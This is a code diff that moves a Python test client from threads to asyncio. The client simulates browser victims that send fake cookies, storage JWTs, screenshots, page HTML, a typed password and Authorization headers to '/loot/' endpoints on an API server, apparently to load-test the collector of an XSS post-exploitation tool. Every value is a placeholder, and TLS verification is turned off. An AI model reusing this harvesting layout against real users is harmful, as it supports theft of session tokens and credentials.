@@ -1,6 +1,7 @@
 #!usr/bin/env python
 import json
-import threading
+import asyncio
+import aiohttp
 import time
 import random
 import requests
@@ -12,14 +13,14 @@ import base64
 # holds up
 
 
-numClients = 1
+numClients = 3
 
 
 randStartRange = 1
 randEndRange   = 10
 
 
-apiServer = "https://127.0.0.1:8444"
+apiServer = "https://100.115.92.203:8444/"
 victimApp = "https://vulnerableapp.com"
 
 
@@ -74,18 +75,20 @@ with open('./clientSimulatorScreenshot.png', 'rb') as image_file:
 
 
 
-class Client(threading.Thread):
+class Client:
 	def __init__(self, client_id):
-		super().__init__()
 		self.client_id = client_id
-		self.getUUID()
-
-		print("Client " + str(self.client_id) + " UUID: " + self.uuid)
-
+		self.uuid      = None
 		self._running  = True
 
 
-	def run(self):
+	async def initialize(self, session):
+		await self.getUUID(session)
+		print(f"Client {self.client_id} UUID: {self.uuid}")
+
+
+
+	async def run(self, session):
 		while self._running:
 			print("Client " + str(self.client_id) + " run loop")
 
@@ -98,132 +101,126 @@ class Client(threading.Thread):
 			# User Inputs
 			# API Calls
 
-			self.urlEvent()
-			self.cookieEvent()
+
+			await self.urlEvent(session)
+			await self.cookieEvent(session)
 			time.sleep(0.1)
 
-			self.localStorageEvent()
+			await self.localStorageEvent(session)
 			time.sleep(0.05)
 
-			self.sessionStorageEvent()
+			await self.sessionStorageEvent(session)
 			time.sleep(0.2)
 
-			self.screenshotEvent()
-			self.htmlEvent()
+			await self.screenshotEvent(session)
+			await self.htmlEvent(session)
 			time.sleep(0.3)
 			
-			self.userInputEvent()
-			self.xhrOpenEvent()
-			self.xhrSetHeaderEvent()
-			self.xhrCallEvent()
+			await self.userInputEvent(session)
+			await self.xhrOpenEvent(session)
+			await self.xhrSetHeaderEvent(session)
+			await self.xhrCallEvent(session)
 			time.sleep(0.1)
 			
-			self.fetchSetupEvent()
-			self.fetchHeaderEvent()
-			self.fetchCallEvent()
+			await self.fetchSetupEvent(session)
+			await self.fetchHeaderEvent(session)
+			await self.fetchCallEvent(session)
 
 			sleepAmount = random.randint(randStartRange, randEndRange)
 			print("Client " + str(self.client_id) + " waiting: " + str(sleepAmount))
 			time.sleep(sleepAmount)
 
 
-	def getUUID(self):
+	async def getUUID(self, session):
 		print("Retrieving UUID")
-		req = requests.get(apiServer + '/client/getToken', verify=False)
-		if req.status_code == 200:
-			data = req.json()
-			print(data)
-			self.uuid = data["clientToken"]
-		else:
-			print("Failed to receive UUID")
+		async with session.get(f'{apiServer}/client/getToken', ssl=False) as response:
+			if response.status == 200:
+				data = await response.json()
+				self.uuid = data["clientToken"]
+			else:
+				print("Failed to receive UUID")
 
 
-	def stop(self):
-		print("Stopping client thread...")
-		self._running = False
-
-
-	def cookieEvent(self):
+	async def cookieEvent(self, session):
 		print("Sending cookie...")
-		req = requests.post(apiServer + '/loot/dessert/' + self.uuid, json={
+		await session.post(f'{apiServer}/loot/dessert/{self.uuid}', json={
 			"cookieName": "cookieMonster",
 			"cookieValue": "goYum"
-			}, verify=False)
+			}, ssl=False)
 
 
-	def localStorageEvent(self):
+	async def localStorageEvent(self, session):
 		print("Sending local storage event...")
-		req = requests.post(apiServer + '/loot/localstore/' + self.uuid, json={
+		await session.post(f'{apiServer}/loot/localstore/{self.uuid}', json={
 			"key": "localStorageKey",
 			"value": "localStorageSuperSecretJWTValue"
-			}, verify=False)
+			}, ssl=False)
 
 
-	def sessionStorageEvent(self):
+	async def sessionStorageEvent(self, session):
 		print("Sending session storage event...")
-		req = requests.post(apiServer + '/loot/sessionstore/' + self.uuid, json={
+		await session.post(f'{apiServer}/loot/sessionstore/{self.uuid}', json={
 			"key": "sessionStorageKey",
 			"value": "sessionStorageSuperSecretJWTValue"
-			}, verify=False)
+			}, ssl=False)
 
 
-
-	def urlEvent(self):
+	async def urlEvent(self, session):
 		print("Sending URL event...")
-		req = requests.post(apiServer + '/loot/location/' + self.uuid, json={
+
+		await session.post(f'{apiServer}/loot/location/{self.uuid}', json={
 			"url": victimApp + "/totesDashboard"
-			}, verify=False)
+			}, ssl=False)
 
 
-	def htmlEvent(self):
+	async def htmlEvent(self, session):
 		print("Sending HTML event...")
-		req = requests.post(apiServer + '/loot/html/' + self.uuid, json={
+		await session.post(f'{apiServer}/loot/html/{self.uuid}', json={
 			"url": victimApp + "/totesDashboard",
 			"html": fakeHtml
-			}, verify=False)
+			}, ssl=False)
 
-
-	def screenshotEvent(self):
+	async def screenshotEvent(self, session):
 		print("Sending screenshot event...")
 
-		header = {'Content-Type': 'image/png'}
-		req = requests.post(apiServer + '/loot/screenshot/' + self.uuid, 
-			data = screenshotData, 
-			headers=header, verify=False)
+		headers = {'Content-Type': 'image/png'}
+		async with session.post(f'{apiServer}/loot/screenshot/{self.uuid}', 
+             data=screenshotData, 
+             headers=headers, 
+             ssl=False) as response:
+			print("Sent screenshot")
 
-
-	def userInputEvent(self):
+	async def userInputEvent(self, session):
 		print("Sending user input event...")
-		req = requests.post(apiServer + '/loot/input/' + self.uuid, json={
+		await session.post(f'{apiServer}/loot/input/{self.uuid}', json={
 			"inputName": "secretPassword",
 			"inputValue": "MyVoiceIsMyPassport"
-			}, verify=False)
+			}, ssl=False)
 
-
-	def xhrOpenEvent(self):
+	async def xhrOpenEvent(self, session):
 		print("Sending XHR Open event...")
-		req = requests.post(apiServer + '/loot/xhrOpen/' + self.uuid, json={
+		await session.post(f'{apiServer}/loot/xhrOpen/{self.uuid}', json={
 			"method": "POST",
 			"url": victimApp + "/sensitiveAPI/secretShit"
-			}, verify=False)
+			}, ssl=False)
 
 
-	def xhrSetHeaderEvent(self):
+
+	async def xhrSetHeaderEvent(self, session):
 		print("Sending XHR Header Event...")
-		req = requests.post(apiServer + '/loot/xhrSetHeader/' + self.uuid, json={
+		await session.post(f'{apiServer}/loot/xhrSetHeader/{self.uuid}', json={
 			"header": "Authorization",
 			"value": "SECRET_JWT_VALUE"
-			}, verify=False)
+			}, ssl=False)
 
-		req = requests.post(apiServer + '/loot/xhrSetHeader/' + self.uuid, json={
+		await session.post(f'{apiServer}/loot/xhrSetHeader/{self.uuid}', json={
 			"header": "RandomHeader",
 			"value": "SomethingOrAnother"
-			}, verify=False)
+			}, ssl=False)
 
 
 
-
-	def xhrCallEvent(self):
+	async def xhrCallEvent(self, session):
 		print("Sending XHR call event...")
 
 		requestString  = "{'something':'something value', 'something else': 'some other value'}"
@@ -232,30 +229,31 @@ class Client(threading.Thread):
 		requestBody  = base64.b64encode(requestString.encode())
 		responseBody = base64.b64encode(responseString.encode())
 
-		req = requests.post(apiServer + '/loot/xhrCall/' + self.uuid, json={
+		await session.post(f'{apiServer}/loot/xhrCall/{self.uuid}', json={
 			"requestBody": requestBody.decode(),
 			"responseBody": responseBody.decode()
-			}, verify=False)
+			}, ssl=False)
 
 
-	def fetchSetupEvent(self):
+	async def fetchSetupEvent(self, session):
 		print("Sending Fetch Setup Event...")
-		req = requests.post(apiServer + '/loot/fetchSetup/' + self.uuid, json={
+		await session.post(f'{apiServer}/loot/fetchSetup/{self.uuid}', json={
 			"method": "POST",
 			"url": victimApp + "/sensitiveAPI/fetchSecretShit"
-			}, verify=False)
+			}, ssl=False)
 
 
-	def fetchHeaderEvent(self):
+
+
+	async def fetchHeaderEvent(self, session):
 		print("Sending Fetch Header Event...")
-		req = requests.post(apiServer + '/loot/fetchHeader/' + self.uuid, json={
+		await session.post(f'{apiServer}/loot/fetchHeader/{self.uuid}', json={
 			"header": "Authorization",
 			"value":"SECRET_JWT_VALUE"
-			}, verify=False)
+			}, ssl=False)
 
 
-
-	def fetchCallEvent(self):
+	async def fetchCallEvent(self, session):
 		print("Sending Fetch Call Event...")
 
 		requestString  = "{'something':'fetchSomething value', 'something else': 'fetch some other value'}"
@@ -264,29 +262,29 @@ class Client(threading.Thread):
 		requestBody  = base64.b64encode(requestString.encode())
 		responseBody = base64.b64encode(responseString.encode())
 
-		req = requests.post(apiServer + '/loot/fetchCall/' + self.uuid, json={
+		await session.post(f'{apiServer}/loot/fetchCall/{self.uuid}', json={
 			"requestBody": requestBody.decode(),
 			"responseBody": responseBody.decode()
-			}, verify=False)
+			}, ssl=False)
 
 
 
+async def main():
+    async with aiohttp.ClientSession() as session:
+       clients = [Client(client_id=i) for i in range(numClients)]
+       await asyncio.gather(*(client.initialize(session) for client in clients))
+       tasks = [client.run(session) for client in clients]
+       await asyncio.gather(*tasks)
 
 if __name__ == "__main__":
-	clientThreads = []
+	asyncio.run(main())
 
-	for i in range(numClients):
-		clientThread = Client(client_id=i)
-		clientThread.start()
-		clientThreads.append(clientThread)
+	# try:
+	# 	while True:
+	# 		time.sleep(5)
+	# except KeyboardInterrupt:
+	# 	for clientThread in clientThreads:
+	# 		clientThread.stop()
 
-
-	try:
-		while True:
-			time.sleep(5)
-	except KeyboardInterrupt:
-		for clientThread in clientThreads:
-			clientThread.stop()
-
-		for clientThread in clientThreads:
-			clientThread.join()
+	# 	for clientThread in clientThreads:
+	# 		clientThread.join()
